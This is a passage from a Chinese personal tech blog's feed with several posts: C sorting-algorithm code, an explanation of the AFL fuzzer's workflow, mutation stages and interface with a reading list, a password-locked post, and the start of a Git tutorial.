&#123;</span><br><span class="line">                temp = arr[j];</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123; <span class="number">22</span>, <span class="number">34</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">82</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">64</span>, <span class="number">35</span>, <span class="number">9</span>, <span class="number">70</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> len = (<span class="keyword">int</span>) <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(*arr);</span><br><span class="line">    bubble_sort(arr, len);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, arr[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-选择排序font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-选择排序font"></a> <font color="navy"><code>0x01 选择排序</code></font></h3><p><img src="/images/146-3.png" alt></p><h4 id="1算法思想-2"><a class="markdownIt-Anchor" href="#1算法思想-2"></a> <code>1.算法思想</code></h4><blockquote><p>它的工作原理如下。首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。</p></blockquote><h4 id="2图解算法-2"><a class="markdownIt-Anchor" href="#2图解算法-2"></a> <code>2.图解算法</code></h4><p><img src="/images/146-4.jpg" alt></p><h4 id="3算法实现-2"><a class="markdownIt-Anchor" href="#3算法实现-2"></a> <code>3.算法实现</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span> <span class="comment">//交換兩個變數</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selection_sort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; len - <span class="number">1</span> ; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> min = i;</span><br><span class="line">        <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; len; j++)     <span class="comment">//走訪未排序的元素</span></span><br><span class="line">            <span class="keyword">if</span> (arr[j] &lt; arr[min])    <span class="comment">//找到目前最小值</span></span><br><span class="line">                min = j;    <span class="comment">//紀錄最小值</span></span><br><span class="line">        swap(&amp;arr[min], &amp;arr[i]);    <span class="comment">//做交換</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x02-插入排序font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-插入排序font"></a> <font color="navy"><code>0x02 插入排序</code></font></h3><p><img src="/images/146-5.gif" alt></p><h4 id="1"><a class="markdownIt-Anchor" href="#1"></a> <code>1.</code></h4><p>``</p><p>``</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-orangec-排序算法font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-orangec-排序算法font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;orange&quot;&gt;&lt;code&gt;C 排序算法
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>AFL详细总结（持续更新）</title>
    <link href="https://muzibing.github.io/2020/08/25/2020.08.24%EF%BC%88145%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/25/2020.08.24（145）/</id>
    <published>2020-08-24T16:00:00.000Z</published>
    <updated>2020-09-02T03:03:00.644Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-afl的流程font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-afl的流程font"></a> <font color="navy"><code>0x00 AFL的流程</code></font></h3><p><img src="/images/145-1.jpg" alt></p><h4 id="font-color-blue1afl整体框架font"><a class="markdownIt-Anchor" href="#font-color-blue1afl整体框架font"></a> <font color="blue"><code>1.AFL整体框架</code></font></h4><blockquote><ol><li><p>main函数先进行初始化和选项处理；</p></li><li><p>执行input文件夹下的预先准备的所有testcase（perform_dry_run），生成初始化的queue和bitmap；</p></li><li><p>通过cull_queue对queue进行精选，减小input的量；</p></li><li><p>然后进行while(1)循环不断进行fuzz。</p></li></ol><p>每次在fuzz一个queue后，就会进入while(1),并重新调用cull_queue()对队列进行精选，而在while(1)具体实现以下过程：</p><ol><li><p>cull_queue()根据top_rated设置queue中的favored标志，对queue进行精选，选出favored</p></li><li><p>判断queue_cur是否为NULL，如果是，则表示已经完成对队列的遍历，queue_cycle++,初始化相关参数，重新开始遍历队列；</p></li><li><p>fuzz queue_cur对应的input文件；</p></li><li><p>判断是否结束，并更新queue_cur和current_entry；</p></li></ol><p>当队列中的所有文件都经过变异测试了，则完成一次”cycle done”;<br>整个队列又会从第一个文件开始，再次继续进行变异，不过与第一次变异不同的是，因为没有随机性，这一次变异就不需要再进行deterministic fuzzing了。而至于什么是deterministic fuzzing，我们在下面的fuzz策略中会作介绍；</p></blockquote><h4 id="font-colorblue2afl的fuzz策略font"><a class="markdownIt-Anchor" href="#font-colorblue2afl的fuzz策略font"></a> <font color="blue"><code>2.AFL的fuzz策略</code></font></h4><blockquote><p>总的来讲，AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下：</p><ol><li><p>bitflip，按位翻转，1变为0，0变为1</p></li><li><p>arithmetic，整数加/减算术运算</p></li><li><p>interest，把一些特殊内容替换到原文件中</p></li><li><p>dictionary，把自动生成或用户提供的token替换/插入到原文件中</p></li><li><p>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异</p></li><li><p>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</p></li></ol><p>其中，前四项bitflip, arithmetic, interest, dictionary由于其变异方式没有随机性，所以也称为deterministic fuzzing；而havoc和splice则存在随机性，是所有状况的fuzzer（是否dumb mode、主从fuzzer）都会执行的变异。</p><p><code>bitflip变异</code>：拿到一个原始文件，首先的变异类型就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为：</p><ul><li>bitflip 1/1，每次翻转1个bit，按照每1个bit的步长从头开始</li><li>bitflip 2/1，每次翻转相邻的2个bit，按照每1个bit的步长从头开始</li><li>bitflip 4/1，每次翻转相邻的4个bit，按照每1个bit的步长从头开始</li><li>bitflip 8/8，每次翻转相邻的8个bit，按照每8个bit的步长从头开始，即依次对每个byte做翻转</li></ul><p><code>effector map的生成</code>：</p><p>完成bitflip 8/8的同时，还生成了effector map，该作用是对byte进行标记，在对每个byte进行翻转变异时，其新的执行路径与原来的路径不一致时，就对该byte标记为1，表示即为有效的，否则标记为0；这样做的优点是如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。</p><ul><li>bitflip 16/8，每次翻转相邻的16个bit，按照每8个bit的步长从头开始，即依次对每个word做翻转</li><li>bitflip 32/8，每次翻转相邻的32个bit，按照每8个bit的步长从头开始，即依次对每个dword做翻转</li></ul><p><code>arithmetic变异</code>：</p><ul><li>arith 8/8，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异</li><li>arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异</li><li>arith 32/8，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异</li></ul><p>加减运算的相关设置在config.h定义，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。此外，AFL会智能的跳过某些arithmetic,第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。</p><p><code>interest变异</code>：</p><ul><li>interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换</li><li>interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换</li><li>interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换</li></ul><p>其中interest value的值在config.h已经设定好</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="meta">#<span class="meta-keyword">define</span> INTERESTING_8 \</span></span><br><span class="line">&gt;   <span class="number">-128</span>,         <span class="comment">/* Overflow signed 8-bit when decremented  */</span> \</span><br><span class="line">&gt;   <span class="number">-1</span>,           <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">0</span>,            <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">1</span>,            <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">16</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">32</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">64</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">100</span>,          <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">127</span>           <span class="comment">/* Overflow signed 8-bit when incremented  */</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>可以看到，用于替换的基本都是可能会造成溢出的数;与之前相同，effector map仍然会用于判断是否需要变异；</p><p><code>dictionary变异</code>：</p><ul><li>user extras (over)，从头开始，将用户提供的tokens依次替换到原文件中</li><li>user extras (insert)，从头开始，将用户提供的tokens依次插入到原文件中</li><li>auto extras (over)，从头开始，将自动检测的tokens依次替换到原文件中</li></ul><p><code>tokens</code>：</p><p>在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token。</p><p><code>havoc变异</code>：</p><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li></ul></blockquote><h4 id="font-color-blue3bitmapfont"><a class="markdownIt-Anchor" href="#font-color-blue3bitmapfont"></a> <font color="blue"><code>3.Bitmap</code></font></h4><p><img src="/images/145-3.png" alt></p><h3 id="font-colornavy0x01-afl界面介绍font"><a class="markdownIt-Anchor" href="#font-colornavy0x01-afl界面介绍font"></a> <font color="navy"><code>0x01 AFL界面介绍</code></font></h3><p><img src="/images/145-2.png" alt></p><p><code>process timing</code></p><blockquote><p>展示了当前fuzzer的运行时间、最近一次发现新执行路径的时间、最近一次崩溃的时间、最近一次超时的时间。值得注意的是第2项，最近一次发现新路径的时间。如果由于目标二进制文件或者命令行参数出错，那么其执行路径应该是一直不变的，所以如果从fuzzing开始一直没有发现新的执行路径，那么就要考虑是否有二进制或者命令行参数错误的问题了。</p></blockquote><p><code>overall results</code></p><blockquote><p>这里包括运行的总周期数、总路径数、崩溃次数、超时次数。其中，总周期数可以用来作为何时停止fuzzing的参考。随着不断地fuzzing，周期数会不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。一般来说，当其变为绿色时，代表可执行的内容已经很少了，继续fuzzing下去也不会有什么新的发现了。此时，我们便可以通过Ctrl-C，中止当前的fuzzing。</p></blockquote><p><code>cycle progress</code></p><blockquote><p>该部分展示了当前cycle的队列中fuzzer的距离、当前工作的测试用例的ID</p></blockquote><p><code>Map coverage</code></p><blockquote><p>该部分的第一行介绍了碰撞的分支元组，与bitmap成正比；数字的左半部分是当前的输入，右半部分是整个语料库的值。</p></blockquote><p><code>Stage progress</code></p><blockquote><p>这里包括正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度。执行速度可以直观地反映当前跑的快不快，如果速度过慢，比如低于500次每秒，那么测试时间就会变得非常漫长。如果发生了这种情况，那么我们需要进一步调整优化我们的fuzzing。</p></blockquote><h3 id="font-colornavy0x02-afl的相关计算font"><a class="markdownIt-Anchor" href="#font-colornavy0x02-afl的相关计算font"></a> <font color="navy"><code>0x02 AFL的相关计算</code></font></h3><h4 id="font-color-blue1覆盖率计算font"><a class="markdownIt-Anchor" href="#font-color-blue1覆盖率计算font"></a> <font color="blue"><code>1.覆盖率计算</code></font></h4><h3 id="font-color-navy0x03-源码分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-源码分析font"></a> <font color="navy"><code>0x03 源码分析</code></font></h3><h3 id="font-color-navyafl-相关文章font"><a class="markdownIt-Anchor" href="#font-color-navyafl-相关文章font"></a> <font color="navy"><code>AFL 相关文章</code></font></h3><p><strong>安装使用</strong></p><ol><li>AFL入门<br><a href="https://www.cnblogs.com/0xHack/p/9414444.html" target="_blank" rel="noopener">https://www.cnblogs.com/0xHack/p/9414444.html</a></li><li>[原创][新手向] 使用AFL来fuzz upx<br><a href="https://bbs.pediy.com/thread-249179.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-249179.htm</a></li><li>[翻译]使用AFL进行fuzz<br><a href="https://bbs.pediy.com/thread-250866.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-250866.htm</a></li><li>AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing<br><a href="https://paper.seebug.org/841/" target="_blank" rel="noopener">https://paper.seebug.org/841/</a></li><li>AFL 漏洞挖掘技术漫谈（二）：Fuzz 结果分析和代码覆盖率<br><a href="https://paper.seebug.org/842/" target="_blank" rel="noopener">https://paper.seebug.org/842/</a></li><li>afl-fuzz技术初探<br><a href="https://www.cnblogs.com/WangAoBo/p/8280352.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/8280352.html</a></li><li>AFL使用指南<br><a href="http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz/" target="_blank" rel="noopener">http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz/</a></li><li>Fuzz Testing with afl-fuzz (American Fuzzy Lop)<br><a href="https://spin.atomicobject.com/2015/08/23/fuzz-testing-american-fuzzy-lop/" target="_blank" rel="noopener">https://spin.atomicobject.com/2015/08/23/fuzz-testing-american-fuzzy-lop/</a></li></ol><p><strong>白皮书及文档翻译</strong></p><ol><li>使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（一）——使用初体验<br><a href="https://blog.csdn.net/youkawa/article/details/45696317" target="_blank" rel="noopener">https://blog.csdn.net/youkawa/article/details/45696317</a></li><li>使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（二）——详细使用说明（README.txt ）<br><a href="https://blog.csdn.net/youkawa/article/details/76405468" target="_blank" rel="noopener">https://blog.csdn.net/youkawa/article/details/76405468</a></li><li>使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（三）——技术白皮书（technical whitepaper）<br><a href="https://blog.csdn.net/youkawa/article/details/76615480" target="_blank" rel="noopener">https://blog.csdn.net/youkawa/article/details/76615480</a></li><li>afl技术白皮书笔记(1)<br><a href="https://ljie.space/2018/01/22/afl%E6%8A%80%E6%9C%AF%E7%99%BD%E7%9A%AE%E4%B9%A6%E7%AC%94%E8%AE%B0-1/" target="_blank" rel="noopener">https://ljie.space/2018/01/22/afl技术白皮书笔记-1/</a></li><li>afl-fuzz技术白皮书<br><a href="https://blog.csdn.net/gengzhikui1992/article/details/50844857" target="_blank" rel="noopener">https://blog.csdn.net/gengzhikui1992/article/details/50844857</a></li></ol><p><strong>技术分析</strong></p><ol><li>★★ 漏洞挖掘技术之 AFL 项目分析<br><a href="https://bbs.pediy.com/thread-249912.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-249912.htm</a></li><li>[原创]afl-fuzz源码情景分析，详细读码笔记，freemind版本和word版本<br><a href="https://bbs.pediy.com/thread-218671.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218671.htm</a></li><li>AFL技术实现分析<br><a href="https://blog.csdn.net/qq_32464719/article/details/80592902#comments" target="_blank" rel="noopener">https://blog.csdn.net/qq_32464719/article/details/80592902#comments</a></li><li>★★ AFL内部实现细节小记<br><a href="http://rk700.github.io/2017/12/28/afl-internals/" target="_blank" rel="noopener">http://rk700.github.io/2017/12/28/afl-internals/</a></li><li>★★ AFL文件变异一览<br><a href="http://rk700.github.io/2018/01/04/afl-mutations/" target="_blank" rel="noopener">http://rk700.github.io/2018/01/04/afl-mutations/</a></li><li>AFL改进小试<br><a href="http://rk700.github.io/2018/02/02/afl-enhancement/" target="_blank" rel="noopener">http://rk700.github.io/2018/02/02/afl-enhancement/</a></li><li>★★ AFL-fuzz工具分析<br><a href="https://blog.csdn.net/Chen_zju/article/details/80791268" target="_blank" rel="noopener">https://blog.csdn.net/Chen_zju/article/details/80791268</a></li><li>AFL源码分析笔记(一)<br><a href="https://xz.aliyun.com/t/4628" target="_blank" rel="noopener">https://xz.aliyun.com/t/4628</a></li><li>AFL源码分析1——afl-gcc.c源码分析<br><a href="https://ch4r1l3.github.io/2019/03/05/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901%E2%80%94%E2%80%94afl-gcc-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/05/AFL源码分析1——afl-gcc-c源码分析/</a></li><li>AFL源码分析2——afl-as.c源码分析<br><a href="https://ch4r1l3.github.io/2019/03/06/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%902%E2%80%94%E2%80%94afl-as-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/06/AFL源码分析2——afl-as-c源码分析/</a></li><li>AFL源码分析3——afl-as.h源码分析<br><a href="https://ch4r1l3.github.io/2019/03/08/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%903%E2%80%94%E2%80%94afl-as-h%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/08/AFL源码分析3——afl-as-h源码分析/</a></li><li>AFL源码分析4——afl-fuzz.c源码分析1<br><a href="https://ch4r1l3.github.io/2019/03/09/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%904%E2%80%94%E2%80%94afl-fuzz-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/09/AFL源码分析4——afl-fuzz-c源码分析1/</a></li><li>AFL源码分析5——afl-fuzz.c源码分析2<br><a href="https://ch4r1l3.github.io/2019/03/10/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%905%E2%80%94%E2%80%94afl-fuzz-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%902/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/10/AFL源码分析5——afl-fuzz-c源码分析2/</a></li><li>afl fuzzer 源代码阅读<br><a href="https://www.cnblogs.com/jg01/p/9772700.html" target="_blank" rel="noopener">https://www.cnblogs.com/jg01/p/9772700.html</a></li><li>AFL不同文件结构<br><a href="https://barro.github.io/2018/06/afl-fuzz-on-different-file-systems/" target="_blank" rel="noopener">https://barro.github.io/2018/06/afl-fuzz-on-different-file-systems/</a></li><li>Fuzzing workflows; a fuzz job from start to finish<br><a href="https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/" target="_blank" rel="noopener">https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/</a></li></ol><p><strong>AFL 项目</strong></p><ol><li>AFL最原始版本,源码地址<br><a href="https://github.com/google/AFL" target="_blank" rel="noopener">https://github.com/google/AFL</a></li><li>[翻译]AFL生态圈 (这篇文章有很多关于AFL的开源项目地址和简单介绍）<br><a href="https://bbs.pediy.com/thread-251051.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251051.htm</a></li><li>AFLplusplus(该工具做了一些集成)<br><a href="https://github.com/vanhauser-thc/AFLplusplus" target="_blank" rel="noopener">https://github.com/vanhauser-thc/AFLplusplus</a></li><li>[分享]关于 fuzz 的 一点总结<br><a href="https://bbs.pediy.com/thread-249986.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-249986.htm</a></li></ol><p><a href="https://www.jianshu.com/p/cc7a486e5adb" target="_blank" rel="noopener">(译)afl-fuzz白皮书</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-afl的流程font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-afl的流程font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="AFL" scheme="https://muzibing.github.io/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>网路安全学习库</title>
    <link href="https://muzibing.github.io/2020/08/23/2020.08.23%EF%BC%88144%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/23/2020.08.23（144）/</id>
    <published>2020-08-22T16:00:00.000Z</published>
    <updated>2020-09-06T03:15:38.470Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="63134dc7004b1af6f981d250d2860c3e7f7ab32a66bbc41cec076c7f713a355d"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Git以及Github的使用教程</title>
    <link href="https://muzibing.github.io/2020/07/29/2020.07.29%EF%BC%88143%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/29/2020.07.29（143）/</id>
    <published>2020-07-28T16:00:00.000Z</published>
    <updated>2020-08-23T10:14:39.697Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、Git-教程"><a href="#一、Git-教程" class="headerlink" title="一、Git 教程"></a>一、Git 教程</h3><h4 id="1-Git-介绍"><a href="#1-Git-介绍" class="headerlink" title="1.Git 介绍"></a>1.Git 介绍</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Git (/ɡɪt/) is a distributed version-control system for tracking changes in source code during software development.[8] It is designed for coordinating work among programmers, but it can be used to track changes in any set of files. Its goals include speed,[9] data integrity,[10] and support for distributed, non-linear workflows.[11]  Git was created by Linus Torvalds in 2005 for development of the Linux kernel, with other kernel developers contributing to its initial development.[12] Its current maintainer since 2005 is Junio Hamano. As with most other distributed version-control systems, and unlike most client–server systems, every Git directory on every computer is a full-fledged repository with complete history and full version-tracking abilities, independent of network access or a central server.[13] Git is free and open-source software distributed under the terms of the GNU General Public License version 2.—wiki</p><blockquote><p>Git是一个分布式版本控制系统，用于在软件开发过程中跟踪源代码的变化。它是为协调程序员之间的工作而设计的，但可用于跟踪任何文件集中的更改。其目标包括速度数据完整性以及对分布式非线性工作流的支持。</p><p>Git由Linus Torvalds于2005年创建，用于Linux内核的开发，其他内核开发人员也为Git的初始开发做出了贡献。自2005年以来，它的当前维护者是Junio Hamano。与大多数其他分布式版本控制系统一样，与大多数客户端服务器系统不同，每台计算机上的每个Git目录都是具有完整历史记录和完整版本跟踪功能的成熟存储库，而与网络访问或中央服务器无关。 Git是根据GNU通用公共许可版本2的条款分发的免费和开源软件。</p></blockquote><h4 id="2-安装Git"><a href="#2-安装Git" class="headerlink" title="2.安装Git"></a>2.安装Git</h4><p><code>Linux</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><p><code>Windows</code></p><blockquote><p>在Windows上使用Git，可以从Git官网直接<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">下载安装程序</a>，然后按默认选项安装即可。安装完成后，在开始菜单里找到“Git”-&gt;“Git Bash”，蹦出一个类似命令行窗口的东西，就说明Git安装成功！</p></blockquote><p><code>配置Git用户名</code></p><blockquote><p>这要和配置github的信息要区分开来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"Your Name"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"email@example.com"</span></span></span><br></pre></td></tr></table></figure><h4 id="3-创建版本库"><a href="#3-创建版本库" class="headerlink" title="3.创建版本库"></a>3.创建版本库</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先有必要了解一下版本库的工作区和暂存区：</p><p><img src="/images/143-1.png" alt></p><blockquote><p>如上图所示，工作区有一个隐藏目录<code>.git</code>，这个不算工作区，而是Git的版本库，上图就是在演示将文件从工作区移到版本库中，分为了两步。Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支<code>master</code>，以及指向<code>master</code>的一个指针叫<code>HEAD</code>。</p><p>一定要在空目录下创建</p></blockquote><p><code>初始化</code></p><blockquote><p>将自己创建的空目录变为Git可以管理的仓库</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br></pre></td></tr></table></figure><p><code>把文件添加到版本库</code></p><blockquote><p>第一步，用命令<code>git add</code>告诉Git，把文件添加到仓库：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add fileName</span></span><br></pre></td></tr></table></figure><blockquote><p>第二步，用命令<code>git commit</code>告诉Git，把文件提交到仓库：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"&lt;本次提交的说明&gt;"</span></span></span><br></pre></td></tr></table></figure><p><code>查看仓库当前状态</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br></pre></td></tr></table></figure><h4 id="4-修改文件"><a href="#4-修改文件" class="headerlink" title="4.修改文件"></a>4.修改文件</h4><blockquote><p>查看修改的内容</p></blockquote><figure 